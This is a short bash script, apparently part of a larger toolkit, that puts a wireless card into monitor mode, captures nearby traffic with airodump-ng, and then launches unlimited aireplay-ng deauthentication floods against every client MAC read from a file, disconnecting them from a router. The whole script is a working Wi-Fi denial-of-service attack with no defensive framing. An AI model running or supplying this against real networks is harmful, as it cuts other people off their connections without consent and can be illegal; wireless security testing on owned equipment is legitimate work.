#!/bin/bash

router_mac=$(sudo cat _gateway/MAC.txt)
interface=$(sudo cat _gateway/IF.txt)
mac_to_deauth=$(sudo cat store/txt/current.txt)

sudo ifconfig "$interface" down
sudo airmon-ng check kill
sudo iwconfig "$interface" mode monitor
sudo ifconfig "$interface" up
sudo airodump-ng "$interface" --write store/csv/channel
sudo bash deauth_2.sh

python3 get_mac_ch.py
for val in $mac_to_deauth
do
sudo aireplay-ng --deauth 0 -a "$router_mac" -c "$val" "$interface"&
done
sudo ifconfig "$interface" down
sudo iwconfig "$interface" mode managed
if [ "$?" -ne 0 ]
then
sudo iwconfig "$interface" mode managed
fi
sudo service NetworkManager restart
